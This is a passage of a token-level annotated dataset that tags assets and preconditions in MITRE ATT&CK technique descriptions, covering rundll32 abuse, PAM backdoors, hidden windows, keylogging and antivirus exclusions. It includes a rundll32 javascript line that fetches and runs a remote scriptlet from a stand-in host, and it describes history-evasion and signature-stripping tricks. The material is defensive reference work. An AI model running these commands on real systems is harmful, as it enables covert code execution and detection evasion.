Solutions O
may O
help O
adversary O
operations O
blend O
in O
with O
traffic O
that O
is O
seen O
as O
normal O
, O
such O
as O
contacting O
third-party O
web B-TARGET_ASSET
services I-TARGET_ASSET
or O
acquiring O
infrastructure B-TARGET_ASSET
to O
support O
[Proxy](https://attack.mitre.org/techniques/T1090) B-TARGET_ASSET
, O
including O
from O
residential O
proxy B-TARGET_ASSET
services I-TARGET_ASSET
. O 

(Citation: O
amnesty_nso_pegasus)(Citation: O
FBI O
Proxies O
Credential O
Stuffing)(Citation: O
Mandiant O
APT29 O
Microsoft O
365 O
2022) O
Depending O
on O
the O
implementation O
, O
adversaries O
may O
use O
infrastructure B-TARGET_ASSET
that O
makes O
it O
difficult O
to O
physically O
tie O
back O
to O
them O
as O
well O
as O
utilize O
infrastructure B-TARGET_ASSET
that O
can O
be O
rapidly B-PRECON
provisioned I-PRECON
, O
modified B-PRECON
, O
and O
shut B-PRECON
down I-PRECON
. O 


Adversaries O
may O
abuse O
rundll32.exe B-TARGET_ASSET
to O
proxy O
execution O
of O
malicious O
code O
. O 

Using O
rundll32.exe B-TARGET_ASSET
, O
vice O
executing O
directly O
(i.e. O 

[Shared B-TARGET_ASSET
Modules](https://attack.mitre.org/techniques/T1129) I-TARGET_ASSET
) O
, O
may O
avoid O
triggering O
security B-TARGET_ASSET
tools I-TARGET_ASSET
that O
may O
not O
monitor O
execution O
of O
the O
rundll32.exe B-TARGET_ASSET
process I-TARGET_ASSET
because O
of O
allowlists O
or O
false O
positives O
from O
normal O
operations O
. O 

Rundll32.exe B-TARGET_ASSET
is O
commonly O
associated O
with O
executing O
DLL B-TARGET_ASSET
payloads I-TARGET_ASSET
(ex: O
<code>rundll32.exe O
{DLLname, O
DLLfunction}</code>) O
. O 


Rundll32.exe B-TARGET_ASSET
can O
also O
be O
used O
to O
execute O
[Control B-TARGET_ASSET
Panel](https://attack.mitre.org/techniques/T1218/002) I-TARGET_ASSET
Item I-TARGET_ASSET
files I-TARGET_ASSET
( I-TARGET_ASSET
.cpl I-TARGET_ASSET
) I-TARGET_ASSET
through O
the O
undocumented B-PRECON
shell32.dll B-TARGET_ASSET
functions I-TARGET_ASSET
<code>Control_RunDLL</code> O
and O
<code>Control_RunDLLAsUser</code> O
. O 

Double-clicking O
a O
.cpl B-TARGET_ASSET
file I-TARGET_ASSET
also O
causes O
rundll32.exe B-TARGET_ASSET
to O
execute O
. O 

(Citation: O
Trend O
Micro O
CPL) O
For O
example O
, O
[ClickOnce](https://attack.mitre.org/techniques/T1127/002) O
can O
be O
proxied O
through O
Rundll32.exe B-TARGET_ASSET
. O 


Rundll32 O
can O
also O
be O
used O
to O
execute O
scripts B-TARGET_ASSET
such O
as O
JavaScript B-TARGET_ASSET
. O 

This O
can O
be O
done O
using O
a O
syntax O
similar O
to O
this: O
<code>rundll32.exe O
javascript:""\..\mshtml,RunHTMLApplication O
"";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code> O
This O
behavior O
has O
been O
seen O
used O
by O
malware O
such O
as O
Poweliks O
. O 

(Citation: O
This O
is O
Security O
Command O
Line O
Confusion) O

Adversaries O
may O
also O
attempt O
to O
obscure O
malicious O
code O
from O
analysis O
by O
abusing O
the O
manner O
in O
which O
rundll32.exe B-TARGET_ASSET
loads O
DLL B-TARGET_ASSET
function I-TARGET_ASSET
names I-TARGET_ASSET
. O 

As O
part O
of O
Windows O
compatibility O
support O
for O
various O
character O
sets O
, O
rundll32.exe B-TARGET_ASSET
will O
first O
check O
for O
wide/Unicode O
then O
ANSI O
character-supported O
functions O
before O
loading O
the O
specified O
function O
(e.g., O
given O
the O
command O
<code>rundll32.exe O
ExampleDLL.dll, O
ExampleFunction</code> O
, O
rundll32.exe B-TARGET_ASSET
would O
first O
attempt O
to O
execute O
<code>ExampleFunctionW</code> O
, O
or O
failing O
that O
<code>ExampleFunctionA</code> O
, O
before O
loading O
<code>ExampleFunction</code>) O
. O 

Adversaries O
may O
therefore O
obscure O
malicious O
code O
by O
creating O
multiple O
identical O
exported O
function B-TARGET_ASSET
names I-TARGET_ASSET
and O
appending O
<code>W</code> O
and/or O
<code>A</code> O
to O
harmless O
ones O
. O 

(Citation: O
Attackify O
Rundll32.exe O
Obscurity)(Citation: O
Github O
NoRunDll) O
DLL B-TARGET_ASSET
functions I-TARGET_ASSET
can O
also O
be O
exported O
and O
executed O
by O
an O
ordinal O
number O
(ex: O
<code>rundll32.exe O
file.dll,#1</code>) O
. O 


Additionally O
, O
adversaries O
may O
use O
[Masquerading](https://attack.mitre.org/techniques/T1036) O
techniques O
(such O
as O
changing O
DLL O
file O
names O
, O
file O
extensions O
, O
or O
function O
names) O
to O
further O
conceal O
execution O
of O
a O
malicious O
payload O
. O 

(Citation: O
rundll32.exe O
defense O
evasion) O

Adversaries O
may O
attempt O
to O
discover O
containers B-TARGET_ASSET
and O
other O
resources O
that O
are O
available O
within O
a O
containers B-TARGET_ASSET
environment I-TARGET_ASSET
. O 

Other O
resources O
may O
include O
images B-TARGET_ASSET
, O
deployments B-TARGET_ASSET
, O
pods B-TARGET_ASSET
, O
nodes B-TARGET_ASSET
, O
and O
other O
information O
such O
as O
the O
status O
of O
a O
cluster B-TARGET_ASSET
. O 


These O
resources O
can O
be O
viewed O
within O
web B-TARGET_ASSET
applications I-TARGET_ASSET
such O
as O
the O
Kubernetes B-TARGET_ASSET
dashboard I-TARGET_ASSET
or O
can O
be O
queried O
via O
the O
Docker B-TARGET_ASSET
and O
Kubernetes B-TARGET_ASSET
APIs I-TARGET_ASSET
. O 

(Citation: O
Docker O
API)(Citation: O
Kubernetes O
API) O
In O
Docker O
, O
logs B-TARGET_ASSET
may O
leak O
information O
about O
the O
environment O
, O
such O
as O
the O
environment’s O
configuration O
, O
which O
services O
are O
available O
, O
and O
what O
cloud O
provider O
the O
victim O
may O
be O
utilizing O
. O 

The O
discovery O
of O
these O
resources O
may O
inform O
an O
adversary’s O
next O
steps O
in O
the O
environment O
, O
such O
as O
how O
to O
perform O
lateral O
movement O
and O
which O
methods O
to O
utilize O
for O
execution O
. O 


Adversaries O
may O
purchase O
and O
configure O
serverless B-TARGET_ASSET
cloud I-TARGET_ASSET
infrastructure I-TARGET_ASSET
, O
such O
as O
Cloudflare B-TARGET_ASSET
Workers I-TARGET_ASSET
, O
AWS B-TARGET_ASSET
Lambda I-TARGET_ASSET
functions I-TARGET_ASSET
, O
or O
Google B-TARGET_ASSET
Apps I-TARGET_ASSET
Scripts I-TARGET_ASSET
, O
that O
can O
be O
used O
during O
targeting O
. O 

By O
utilizing O
serverless B-TARGET_ASSET
infrastructure I-TARGET_ASSET
, O
adversaries O
can O
make O
it O
more O
difficult O
to O
attribute O
infrastructure B-TARGET_ASSET
used O
during O
operations O
back O
to O
them O
. O 


Once O
acquired B-PRECON
, O
the O
serverless B-TARGET_ASSET
runtime I-TARGET_ASSET
environment I-TARGET_ASSET
can O
be O
leveraged O
to O
either O
respond O
directly O
to O
infected O
machines O
or O
to O
[Proxy](https://attack.mitre.org/techniques/T1090) B-TARGET_ASSET
traffic I-TARGET_ASSET
to O
an O
adversary-owned O
command O
and O
control O
server B-TARGET_ASSET
. O 

(Citation: O
BlackWater O
Malware O
Cloudflare O
Workers)(Citation: O
AWS O
Lambda O
Redirector)(Citation: O
GWS O
Apps O
Script O
Abuse O
2021) O
As O
traffic O
generated O
by O
these O
functions O
will O
appear O
to O
come O
from O
subdomains O
of O
common O
cloud O
providers O
, O
it O
may O
be O
difficult O
to O
distinguish O
from O
ordinary O
traffic O
to O
these O
providers O
- O
making O
it O
easier O
to O
[Hide O
Infrastructure](https://attack.mitre.org/techniques/T1665) O
. O 

(Citation: O
Detecting O
Command O
& O
Control O
in O
the O
Cloud)(Citation: O
BlackWater O
Malware O
Cloudflare O
Workers) O

Adversaries O
may O
implement O
hidden B-PRECON
windows B-TARGET_ASSET
to O
conceal O
malicious O
activity O
from O
the O
plain O
sight O
of O
users O
. O 

In O
some O
cases O
, O
windows B-TARGET_ASSET
that O
would O
typically O
be O
displayed O
when O
an O
application B-TARGET_ASSET
carries O
out O
an O
operation O
can O
be O
hidden B-PRECON
. O 

This O
may O
be O
utilized O
by O
system O
administrators O
to O
avoid O
disrupting O
user O
work O
environments O
when O
carrying O
out O
administrative O
tasks O
. O 

Adversaries O
may O
abuse O
operating B-TARGET_ASSET
system I-TARGET_ASSET
functionality O
to O
hide O
otherwise O
visible O
windows B-TARGET_ASSET
from O
users O
so O
as O
not O
to O
alert O
the O
user O
to O
adversary O
activity O
on O
the O
system B-TARGET_ASSET
. O 


### O
Windows O
There O
are O
a O
variety O
of O
features O
in O
scripting B-TARGET_ASSET
languages I-TARGET_ASSET
in O
Windows O
, O
such O
as O
[PowerShell](https://attack.mitre.org/techniques/T1086) B-TARGET_ASSET
, O
Jscript B-TARGET_ASSET
, O
and O
VBScript B-TARGET_ASSET
to O
make O
windows B-TARGET_ASSET
hidden B-PRECON
. O 

One O
example O
of O
this O
is O
<code>powershell.exe O
-WindowStyle O
Hidden</code> O
. O 

(Citation: O
PowerShell O
About O
2019) O

### O
Mac O
The O
configurations O
for O
how O
applications B-TARGET_ASSET
run O
on O
macOS O
are O
listed O
in O
property B-TARGET_ASSET
list I-TARGET_ASSET
( I-TARGET_ASSET
plist I-TARGET_ASSET
) I-TARGET_ASSET
files I-TARGET_ASSET
. O 

One O
of O
the O
tags O
in O
these O
files B-TARGET_ASSET
can O
be O
<code>apple.awt.UIElement</code> O
, O
which O
allows O
for O
Java O
applications B-TARGET_ASSET
to O
prevent O
the O
application's B-TARGET_ASSET
icon I-TARGET_ASSET
from O
appearing O
in O
the O
Dock B-TARGET_ASSET
. O 

A O
common O
use O
for O
this O
is O
when O
applications B-TARGET_ASSET
run O
in O
the O
system B-TARGET_ASSET
tray I-TARGET_ASSET
, O
but O
don't O
also O
want O
to O
show O
up O
in O
the O
Dock B-TARGET_ASSET
. O 

However O
, O
adversaries O
can O
abuse O
this O
feature O
and O
hide O
their O
running O
window B-TARGET_ASSET
. O 

(Citation: O
Antiquated O
Mac O
Malware) O

Mach-O B-TARGET_ASSET
binaries I-TARGET_ASSET
have O
a O
series O
of O
headers B-TARGET_ASSET
that O
are O
used O
to O
perform O
certain O
operations O
when O
a O
binary B-TARGET_ASSET
is O
loaded O
. O 

The O
LC_LOAD_DYLIB B-TARGET_ASSET
header I-TARGET_ASSET
in O
a O
Mach-O B-TARGET_ASSET
binary I-TARGET_ASSET
tells O
macOS O
and O
OS O
X O
which O
dynamic B-TARGET_ASSET
libraries I-TARGET_ASSET
( I-TARGET_ASSET
dylibs I-TARGET_ASSET
) O
to O
load O
during O
execution O
time O
. O 

These O
can O
be O
added O
ad-hoc O
to O
the O
compiled O
binary B-TARGET_ASSET
as O
long O
adjustments O
are O
made O
to O
the O
rest O
of O
the O
fields O
and O
dependencies O
(Citation: O
Writing O
Bad O
Malware O
for O
OSX) O
. O 

There O
are O
tools O
available O
to O
perform O
these O
changes O
. O 

Any O
changes O
will O
invalidate O
digital O
signatures O
on O
binaries B-TARGET_ASSET
because O
the O
binary B-TARGET_ASSET
is O
being O
modified B-PRECON
. O 

Adversaries O
can O
remediate O
this O
issue O
by O
simply O
removing O
the O
LC_CODE_SIGNATURE B-TARGET_ASSET
command I-TARGET_ASSET
from O
the O
binary B-TARGET_ASSET
so O
that O
the O
signature O
isn’t O
checked O
at O
load O
time O
(Citation: O
Malware O
Persistence O
on O
OS O
X) O
. O 


Adversaries O
may O
encode O
data B-TARGET_ASSET
with O
a O
standard O
data O
encoding O
system O
to O
make O
the O
content O
of O
command O
and O
control O
traffic B-TARGET_ASSET
more O
difficult O
to O
detect O
. O 

Command O
and O
control O
(C2) O
information B-TARGET_ASSET
can O
be O
encoded O
using O
a O
standard O
data O
encoding O
system O
that O
adheres O
to O
existing O
protocol B-TARGET_ASSET
specifications I-TARGET_ASSET
. O 

Common O
data O
encoding O
schemes O
include O
ASCII O
, O
Unicode O
, O
hexadecimal O
, O
Base64 O
, O
and O
MIME O
. O 

(Citation: O
Wikipedia O
Binary-to-text O
Encoding)(Citation: O
Wikipedia O
Character O
Encoding) O
Some O
data O
encoding O
systems O
may O
also O
result O
in O
data O
compression O
, O
such O
as O
gzip O
. O 


Adversaries O
may O
embed O
payloads B-TARGET_ASSET
within O
other O
files B-TARGET_ASSET
to O
conceal O
malicious O
content O
from O
defenses O
. O 

Otherwise O
seemingly O
benign O
files B-TARGET_ASSET
(such O
as O
scripts B-TARGET_ASSET
and O
executables B-TARGET_ASSET
) O
may O
be O
abused O
to O
carry O
and O
obfuscate O
malicious O
payloads B-TARGET_ASSET
and O
content O
. O 

In O
some O
cases O
, O
embedded B-PRECON
payloads B-TARGET_ASSET
may O
also O
enable O
adversaries O
to O
[Subvert O
Trust O
Controls](https://attack.mitre.org/techniques/T1553) O
by O
not O
impacting O
execution O
controls O
such O
as O
digital O
signatures O
and O
notarization O
tickets O
. O 

(Citation: O
Sentinel O
Labs) O

Adversaries O
may O
embed O
payloads B-TARGET_ASSET
in O
various O
file B-TARGET_ASSET
formats I-TARGET_ASSET
to O
hide O
payloads B-TARGET_ASSET
. O 

(Citation: O
Microsoft O
Learn) O
This O
is O
similar O
to O
[Steganography](https://attack.mitre.org/techniques/T1027/003) O
, O
though O
does O
not O
involve O
weaving O
malicious O
content O
into O
specific O
bytes O
and O
patterns O
related O
to O
legitimate O
digital O
media O
formats O
. O 

(Citation: O
GitHub O
PSImage) O

For O
example O
, O
adversaries O
have O
been O
observed O
embedding O
payloads B-TARGET_ASSET
within O
or O
as O
an O
overlay O
of O
an O
otherwise O
benign O
binary B-TARGET_ASSET
. O 

(Citation: O
Securelist O
Dtrack2) O
Adversaries O
have O
also O
been O
observed O
nesting O
payloads B-TARGET_ASSET
(such O
as O
executables B-TARGET_ASSET
and O
run-only O
scripts B-TARGET_ASSET
) O
inside O
a O
file B-TARGET_ASSET
of O
the O
same O
format O
. O 

(Citation: O
SentinelLabs O
reversing O
run-only O
applescripts O
2021) O

Embedded B-PRECON
content B-TARGET_ASSET
may O
also O
be O
used O
as O
[Process O
Injection](https://attack.mitre.org/techniques/T1055) O
payloads B-TARGET_ASSET
used O
to O
infect O
benign O
system B-TARGET_ASSET
processes I-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro) O
These O
embedded B-PRECON
then O
injected O
payloads B-TARGET_ASSET
may O
be O
used O
as O
part O
of O
the O
modules B-TARGET_ASSET
of O
malware B-TARGET_ASSET
designed O
to O
provide O
specific O
features O
such O
as O
encrypting O
C2 O
communications O
in O
support O
of O
an O
orchestrator O
module O
. O 

For O
example O
, O
an O
embedded B-TARGET_ASSET
module I-TARGET_ASSET
may O
be O
injected O
into O
default O
browsers B-TARGET_ASSET
, O
allowing O
adversaries O
to O
then O
communicate O
via O
the O
network B-TARGET_ASSET
. O 

(Citation: O
Malware O
Analysis O
Report O
ComRAT) O

Property B-TARGET_ASSET
list I-TARGET_ASSET
( I-TARGET_ASSET
plist I-TARGET_ASSET
) I-TARGET_ASSET
files I-TARGET_ASSET
contain O
all O
of O
the O
information O
that O
macOS O
and O
OS O
X O
uses O
to O
configure O
applications B-TARGET_ASSET
and O
services B-TARGET_ASSET
. O 

These O
files B-TARGET_ASSET
are O
UTF-8 B-PRECON
encoded I-PRECON
and O
formatted B-PRECON
like I-PRECON
XML I-PRECON
documents I-PRECON
via O
a O
series O
of O
keys O
surrounded O
by O
< O
> O
. O 

They O
detail O
when O
programs O
should O
execute O
, O
file O
paths O
to O
the O
executables O
, O
program O
arguments O
, O
required O
OS O
permissions O
, O
and O
many O
others O
. O 

plists B-TARGET_ASSET
are O
located O
in O
certain O
locations O
depending O
on O
their O
purpose O
such O
as O
<code>/Library/Preferences</code> O
(which O
execute O
with O
elevated O
privileges) O
and O
<code>~/Library/Preferences</code> O
(which O
execute O
with O
a O
user's O
privileges) O
. O 

Adversaries O
can O
modify O
these O
plist B-TARGET_ASSET
files I-TARGET_ASSET
to O
point O
to O
their O
own O
code O
, O
can O
use O
them O
to O
execute O
their O
code O
in O
the O
context O
of O
another O
user O
, O
bypass O
whitelisting O
procedures O
, O
or O
even O
use O
them O
as O
a O
persistence O
mechanism O
. O 

(Citation: O
Sofacy O
Komplex O
Trojan) O

Adversaries O
may O
modify O
pluggable B-TARGET_ASSET
authentication I-TARGET_ASSET
modules I-TARGET_ASSET
( I-TARGET_ASSET
PAM I-TARGET_ASSET
) I-TARGET_ASSET
to O
access O
user O
credentials B-TARGET_ASSET
or O
enable O
otherwise O
unwarranted O
access O
to O
accounts O
. O 

PAM B-TARGET_ASSET
is O
a O
modular O
system O
of O
configuration B-TARGET_ASSET
files I-TARGET_ASSET
, O
libraries B-TARGET_ASSET
, O
and O
executable B-TARGET_ASSET
files I-TARGET_ASSET
which O
guide O
authentication O
for O
many O
services B-TARGET_ASSET
. O 

The O
most O
common O
authentication B-TARGET_ASSET
module I-TARGET_ASSET
is O
<code>pam_unix.so</code> B-TARGET_ASSET
, O
which O
retrieves O
, O
sets O
, O
and O
verifies O
account O
authentication O
information O
in O
<code>/etc/passwd</code> B-TARGET_ASSET
and O
<code>/etc/shadow</code> B-TARGET_ASSET
. O 

(Citation: O
Apple O
PAM)(Citation: O
Man O
Pam_Unix)(Citation: O
Red O
Hat O
PAM) O

Adversaries O
may O
modify O
components O
of O
the O
PAM B-TARGET_ASSET
system I-TARGET_ASSET
to O
create O
backdoors O
. O 

PAM B-TARGET_ASSET
components I-TARGET_ASSET
, O
such O
as O
<code>pam_unix.so</code> B-TARGET_ASSET
, O
can O
be O
patched B-PRECON
to O
accept O
arbitrary O
adversary O
supplied O
values O
as O
legitimate O
credentials O
. O 

(Citation: O
PAM O
Backdoor) O

Malicious O
modifications O
to O
the O
PAM B-TARGET_ASSET
system I-TARGET_ASSET
may O
also O
be O
abused O
to O
steal O
credentials B-TARGET_ASSET
. O 

Adversaries O
may O
infect O
PAM B-TARGET_ASSET
resources I-TARGET_ASSET
with O
code O
to O
harvest O
user O
credentials B-TARGET_ASSET
, O
since O
the O
values O
exchanged O
with O
PAM B-TARGET_ASSET
components I-TARGET_ASSET
may O
be O
plain-text B-PRECON
since O
PAM B-TARGET_ASSET
does O
not O
store O
passwords O
. O 

(Citation: O
PAM O
Creds)(Citation: O
Apple O
PAM) O

An O
adversary O
may O
revert O
changes O
made O
to O
a O
cloud B-TARGET_ASSET
instance I-TARGET_ASSET
after O
they O
have O
performed O
malicious O
activities O
in O
attempt O
to O
evade O
detection O
and O
remove O
evidence O
of O
their O
presence O
. O 

In O
highly O
virtualized O
environments O
, O
such O
as O
cloud-based O
infrastructure B-TARGET_ASSET
, O
this O
may O
be O
accomplished O
by O
restoring O
virtual B-TARGET_ASSET
machine I-TARGET_ASSET
( I-TARGET_ASSET
VM I-TARGET_ASSET
) I-TARGET_ASSET
or O
data B-TARGET_ASSET
storage I-TARGET_ASSET
snapshots I-TARGET_ASSET
through O
the O
cloud B-TARGET_ASSET
management I-TARGET_ASSET
dashboard I-TARGET_ASSET
or O
cloud B-TARGET_ASSET
APIs I-TARGET_ASSET
. O 


Another O
variation O
of O
this O
technique O
is O
to O
utilize O
temporary B-TARGET_ASSET
storage I-TARGET_ASSET
attached B-PRECON
to O
the O
compute B-TARGET_ASSET
instance I-TARGET_ASSET
. O 

Most O
cloud O
providers O
provide O
various O
types O
of O
storage B-TARGET_ASSET
including O
persistent O
, O
local O
, O
and/or O
ephemeral B-PRECON
, O
with O
the O
ephemeral O
types O
often O
reset B-PRECON
upon I-PRECON
stop/restart I-PRECON
of I-PRECON
the I-PRECON
VM B-TARGET_ASSET
. O 

(Citation: O
Tech O
Republic O
- O
Restore O
AWS O
Snapshots)(Citation: O
Google O
- O
Restore O
Cloud O
Snapshot) O

The O
<code>HISTCONTROL</code> B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
keeps O
track O
of O
what O
should O
be O
saved O
by O
the O
<code>history</code> O
command O
and O
eventually O
into O
the O
<code>~/.bash_history</code> B-TARGET_ASSET
file I-TARGET_ASSET
when O
a O
user O
logs O
out O
. O 

This O
setting O
can O
be O
configured B-PRECON
to O
ignore O
commands O
that O
start O
with O
a O
space O
by O
simply O
setting O
it O
to O
""ignorespace"" O
. O 

<code>HISTCONTROL</code> B-TARGET_ASSET
can O
also O
be O
set O
to O
ignore O
duplicate O
commands O
by O
setting O
it O
to O
""ignoredups"" O
. O 

In O
some O
Linux O
systems O
, O
this O
is O
set B-PRECON
by I-PRECON
default I-PRECON
to I-PRECON
""ignoreboth"" I-PRECON
which O
covers O
both O
of O
the O
previous O
examples O
. O 

This O
means O
that O
“ O
ls” O
will O
not O
be O
saved O
, O
but O
“ls” O
would O
be O
saved O
by O
history O
. O 

<code>HISTCONTROL</code> B-TARGET_ASSET
does O
not O
exist B-PRECON
by I-PRECON
default I-PRECON
on O
macOS O
, O
but O
can O
be O
set O
by O
the O
user O
and O
will O
be O
respected O
. O 

Adversaries O
can O
use O
this O
to O
operate O
without O
leaving O
traces O
by O
simply O
prepending O
a O
space O
to O
all O
of O
their O
terminal O
commands O
. O 


Adversaries O
may O
gather O
information O
about O
the O
victim's O
hosts B-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 

Information O
about O
hosts B-TARGET_ASSET
may O
include O
a O
variety O
of O
details O
, O
including O
administrative O
data O
(ex: O
name O
, O
assigned O
IP O
, O
functionality O
, O
etc.) O
as O
well O
as O
specifics O
regarding O
its O
configuration O
(ex: O
operating O
system O
, O
language O
, O
etc.) O
. O 


Adversaries O
may O
gather O
this O
information O
in O
various O
ways O
, O
such O
as O
direct O
collection O
actions O
via O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
. O 

Adversaries O
may O
also O
compromise O
sites B-TARGET_ASSET
then O
include O
malicious O
content O
designed O
to O
collect O
host B-TARGET_ASSET
information I-TARGET_ASSET
from O
visitors O
. O 

(Citation: O
ATT O
ScanBox) O
Information O
about O
hosts B-TARGET_ASSET
may O
also O
be O
exposed B-PRECON
to O
adversaries O
via O
online O
or O
other O
accessible O
data O
sets O
(ex: O
[Social O
Media](https://attack.mitre.org/techniques/T1593/001) O
or O
[Search O
Victim-Owned O
Websites](https://attack.mitre.org/techniques/T1594)) O
. O 

Gathering O
this O
information O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593) O
or O
[Search O
Open O
Technical O
Databases](https://attack.mitre.org/techniques/T1596)) O
, O
establishing O
operational O
resources O
(ex: O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
or O
[Obtain O
Capabilities](https://attack.mitre.org/techniques/T1588)) O
, O
and/or O
initial O
access O
(ex: O
[Supply O
Chain O
Compromise](https://attack.mitre.org/techniques/T1195) O
or O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133)) O
. O 


Adversaries O
may O
also O
gather O
victim O
host B-TARGET_ASSET
information I-TARGET_ASSET
via O
User-Agent B-TARGET_ASSET
HTTP I-TARGET_ASSET
headers I-TARGET_ASSET
, O
which O
are O
sent O
to O
a O
server B-TARGET_ASSET
to O
identify O
the O
application B-TARGET_ASSET
, O
operating B-TARGET_ASSET
system I-TARGET_ASSET
, O
vendor O
, O
and/or O
version O
of O
the O
requesting O
user O
agent O
. O 

This O
can O
be O
used O
to O
inform O
the O
adversary’s O
follow-on O
action O
. O 

For O
example O
, O
adversaries O
may O
check O
user O
agents O
for O
the O
requesting O
operating B-TARGET_ASSET
system I-TARGET_ASSET
, O
then O
only O
serve O
malware B-TARGET_ASSET
for O
target O
operating B-TARGET_ASSET
systems I-TARGET_ASSET
while O
ignoring O
others O
. O 

(Citation: O
TrellixQakbot) O

Adversaries O
may O
search O
public O
digital B-TARGET_ASSET
certificate I-TARGET_ASSET
data I-TARGET_ASSET
for O
information O
about O
victims O
that O
can O
be O
used O
during O
targeting O
. O 

Digital B-TARGET_ASSET
certificates I-TARGET_ASSET
are O
issued O
by O
a O
certificate O
authority O
(CA) O
in O
order O
to O
cryptographically O
verify O
the O
origin O
of O
signed O
content O
. O 

These O
certificates B-TARGET_ASSET
, O
such O
as O
those O
used O
for O
encrypted O
web O
traffic B-TARGET_ASSET
(HTTPS O
SSL/TLS O
communications O
) O
, O
contain O
information O
about O
the O
registered O
organization O
such O
as O
name O
and O
location O
. O 

Adversaries O
may O
search O
digital B-TARGET_ASSET
certificate I-TARGET_ASSET
data I-TARGET_ASSET
to O
gather O
actionable O
information O
. O 

Threat O
actors O
can O
use O
online O
resources O
and O
lookup O
tools O
to O
harvest O
information O
about O
certificates B-TARGET_ASSET
. O 

(Citation: O
SSLShopper O
Lookup) O
Digital B-TARGET_ASSET
certificate I-TARGET_ASSET
data I-TARGET_ASSET
may O
also O
be O
available B-PRECON
from O
artifacts B-TARGET_ASSET
signed B-PRECON
by I-PRECON
the I-PRECON
organization I-PRECON
(ex: O
certificates B-TARGET_ASSET
used O
from O
encrypted O
web O
traffic B-TARGET_ASSET
are O
served O
with O
content O
) O
. O 

(Citation: O
Medium O
SSL O
Cert) O
Information O
from O
these O
sources O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598)) O
, O
establishing O
operational O
resources O
(ex: O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
or O
[Obtain O
Capabilities](https://attack.mitre.org/techniques/T1588)) O
, O
and/or O
initial O
access O
(ex: O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133) O
or O
[Trusted O
Relationship](https://attack.mitre.org/techniques/T1199)) O
. O 


Adversaries O
may O
log O
user O
keystrokes B-TARGET_ASSET
to O
intercept O
credentials B-TARGET_ASSET
as O
the O
user O
types O
them O
. O 

Keylogging O
is O
likely O
to O
be O
used O
to O
acquire O
credentials B-TARGET_ASSET
for O
new O
access O
opportunities O
when O
[OS B-TARGET_ASSET
Credential I-TARGET_ASSET
Dumping](https://attack.mitre.org/techniques/T1003) I-TARGET_ASSET
efforts O
are O
not O
effective O
, O
and O
may O
require O
an O
adversary O
to O
intercept O
keystrokes B-TARGET_ASSET
on O
a O
system B-TARGET_ASSET
for O
a O
substantial O
period O
of O
time O
before O
credentials B-TARGET_ASSET
can O
be O
successfully O
captured O
. O 

In O
order O
to O
increase O
the O
likelihood O
of O
capturing O
credentials B-TARGET_ASSET
quickly O
, O
an O
adversary O
may O
also O
perform O
actions O
such O
as O
clearing O
browser B-TARGET_ASSET
cookies I-TARGET_ASSET
to O
force O
users O
to O
reauthenticate O
to O
systems O
. O 

(Citation: O
Talos O
Kimsuky O
Nov O
2021) O

Keylogging O
is O
the O
most O
prevalent O
type O
of O
input O
capture O
, O
with O
many O
different O
ways O
of O
intercepting O
keystrokes B-TARGET_ASSET
. O 

(Citation: O
Adventures O
of O
a O
Keystroke) O
Some O
methods O
include O
: O

* O
Hooking O
API B-TARGET_ASSET
callbacks I-TARGET_ASSET
used O
for O
processing O
keystrokes B-TARGET_ASSET
. O 

Unlike O
[Credential B-TARGET_ASSET
API I-TARGET_ASSET
Hooking](https://attack.mitre.org/techniques/T1056/004) I-TARGET_ASSET
, O
this O
focuses O
solely O
on O
API B-TARGET_ASSET
functions I-TARGET_ASSET
intended O
for O
processing O
keystroke B-TARGET_ASSET
data I-TARGET_ASSET
. O 

* O
Reading O
raw O
keystroke B-TARGET_ASSET
data I-TARGET_ASSET
from O
the O
hardware B-TARGET_ASSET
buffer I-TARGET_ASSET
. O 

* O
Windows B-TARGET_ASSET
Registry I-TARGET_ASSET
modifications O
. O 

* O
Custom O
drivers B-TARGET_ASSET
. O 

* O
[Modify O
System O
Image](https://attack.mitre.org/techniques/T1601) O
may O
provide O
adversaries O
with O
hooks O
into O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
of O
network B-TARGET_ASSET
devices I-TARGET_ASSET
to O
read O
raw O
keystrokes B-TARGET_ASSET
for O
login O
sessions O
. O 

(Citation: O
Cisco O
Blog O
Legacy O
Device O
Attacks) O

Adversaries O
may O
attempt O
to O
hide O
their O
file-based O
artifacts O
by O
writing O
them O
to O
specific O
folders B-TARGET_ASSET
or O
file B-TARGET_ASSET
names I-TARGET_ASSET
excluded B-PRECON
from I-PRECON
antivirus I-PRECON
( I-PRECON
AV I-PRECON
) I-PRECON
scanning I-PRECON
and O
other O
defensive O
capabilities O
. O 

AV B-TARGET_ASSET
and O
other O
file-based O
scanners O
often O
include O
exclusions O
to O
optimize O
performance O
as O
well O
as O
ease O
installation O
and O
legitimate O
use O
of O
applications O
. O 

These O
exclusions O
may O
be O
contextual O
(e.g., O
scans O
are O
only O
initiated O
in O
response O
to O
specific O
triggering O
events/alerts) O
, O
but O
are O
also O
often O
hardcoded B-PRECON
strings I-PRECON
referencing O
specific O
folders B-TARGET_ASSET
and/or O
files B-TARGET_ASSET
assumed B-PRECON
to I-PRECON
be I-PRECON
trusted I-PRECON
and I-PRECON
legitimate I-PRECON
. O 

(Citation: O
Microsoft O
File O
Folder O
Exclusions) O

Adversaries O
may O
abuse O
these O
exclusions O
to O
hide O
their O
file-based O
artifacts O
. O 

For O
example O
, O
rather O
than O
tampering O
with O
tool O
settings O
to O
add O
a O
new O
exclusion O
(i.e., O
[Disable O
or O
Modify O
Tools](https://attack.mitre.org/techniques/T1562/001)) O
, O
adversaries O
may O
drop O
their O
file-based O
payloads O
in O
default B-PRECON
or O
otherwise O
well-known B-PRECON
exclusions I-PRECON
. O 

Adversaries O
may O
also O
